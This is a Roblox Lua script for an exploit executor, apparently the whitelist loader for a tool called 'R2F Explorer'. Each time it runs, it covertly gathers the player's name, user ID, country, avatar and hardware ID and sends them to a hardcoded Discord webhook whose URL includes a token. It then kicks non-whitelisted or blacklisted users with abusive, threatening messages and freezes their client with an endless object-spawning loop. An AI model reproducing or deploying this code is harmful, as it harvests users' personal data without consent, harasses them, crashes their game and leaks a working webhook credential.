local HttpService = game:GetService("HttpService")
local ls = game:GetService("LocalizationService")
local Webhook_URL = "https://discord.com/api/webhooks/1326078676940492872/ZiQ10ecuffM1x-egD9FpPNSYQGtgt5XDOTdDGNsb3bXKTLjLB3nDH6z1lhac_TfaiJsv"
local S_hwid = game:GetService("RbxAnalyticsService"):GetClientId()
local plre = game.Players.LocalPlayer
local plr = game.Players.LocalPlayer
local DName = plre.DisplayName
local UName = plre.Name
local WV = "false"
local status = "nil"
local Countries = {}

local success, result = pcall(function()
    return request({Url = "http://country.io/names.json", Method = "GET"})
end)

if success and result then
	Countries = HttpService:JSONDecode(result.Body)
end

local maks = "maksimmilana22"

local UserInputService = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ReplicatedFirst = game:GetService("ReplicatedFirst")

local ME = ReplicatedStorage.Events.ME

function IsInDungeon()
    return game.ReplicatedStorage.Dungeon.Value
end

function IsInPvp()
    if plr:FindFirstChild("PvPed") then
        return true
    else
        return false
    end
end

local function GetPlrThumbnail()
    local Link = "https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds="..plr.UserId.."&size=150x150&format=Png"
    local Response = request({Url = Link,Method = "GET"}) -- Send out the response
    
    return HttpService:JSONDecode(Response.Body).data[1].imageUrl
end
local country
local success, code = pcall(ls.GetCountryRegionForPlayerAsync, ls, plr)
if success and code then
    country = Countries[code]
end

local allowed = {
  "4fb1bc99-45e0-49c2-879a-393bd34343ab",
  "c820c269-73b7-4a5d-80cc-eee6bab8692c",
  "56fcb6c0-98e3-4a4b-b61c-a96a741af4cd",
  "6196f2bc-d176-4732-80c5-e9041c439ee9",
  "CE62E500-FC4E-4042-9E1E-4A772A510DB8",
  "32e3db37-5663-4d80-b253-36e8c671de87",
  "6D6C34D1-560C-425C-9E67-B50AB1FC5E20",
  "77f9af64-fe18-4076-94d8-66149cfff536",
  "6786613e-d70e-4fda-9f50-fbe085a31998",
  "f5e71668-de87-4700-93b0-ca93d7e7c6e4",
  660549561, 1113916268,
  "a40f5899-f5b0-44a8-9002-fde810656939"
}

local blacklisted = {"b997b340-4056-40ce-bae7-95ce083d6465", 140378057}

if table.find(allowed, S_hwid) or table.find(allowed, plr.UserId) then
  WV = "Yes"
elseif table.find(blacklisted, S_hwid) or table.find(blacklisted, plr.UserId) then
  WV = "Blacklisted"
elseif not (table.find(allowed, S_hwid) or table.find(allowed, plr.UserId)) or not (table.find(blacklisted, S_hwid) or table.find(blacklisted, plr.UserId)) then 
  WV = "No"
end

local embedcolor

if WV == "Yes" then
  embedcolor = "4388219"
else
  embedcolor = "14887209"
end


if WV == "Yes" and IsInPvp() then
  status = "In Pvp"
  embedcolor = "16562691"
elseif WV == "Yes" and not IsInDungeon() and not IsInPvp() then
  status = "In overworld"
  embedcolor = "5827380"
elseif WV == "Yes" and IsInDungeon() then
  embedcolor = "4360181"
  status = "In dungeon"
elseif WV == "Blacklisted" then
  status = "Blacklisted"
elseif WV == "No" then
  status = "Not whitelisted"
end

local response =
    request(
    {
        Url = Webhook_URL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(
            {
                ["content"] = "",
                ["embeds"] = {
                    {
                        ["title"] = "R2F Explorer has been executed.",
                        ["description"] = DName.. " / "..UName.. " has executed R2F Explorer. \n \n **Status** \n "..status,
                        ["type"] = "rich",
                        ["color"] = embedcolor,
                        ["thumbnail"] = {
                            ["url"] = GetPlrThumbnail()
                        },
                        ["fields"] = {
                           {
                       ["name"] = "Information",
                       ["value"] = "Country: "..country..", UserId: "..tostring(plr.UserId)
                           },
                           {
                        ["name"] = "Hardware Id",
                        ["value"] = S_hwid,
                        ["inline"] = true
                           }
                        }
                    }
                }
            }
        )
    }
)

local SoundEvent = {
    [1] = "repsound",
    [2] = "Teleport"
}

if WV == "Blacklisted" then
  plr:Kick("Your personal information has now been leaked") ME:FireServer(SoundEvent) task.wait(3) while true do local part = Instance.new("Part", workspace) part.Name = "FUCKYOU" end
elseif WV == "No" then
  plr:Kick("You live in "..country..", now fuck off") ME:FireServer(SoundEvent) task.wait(3) while true do local part = Instance.new("Part", workspace) part.Name = "FUCKYOU" end
end
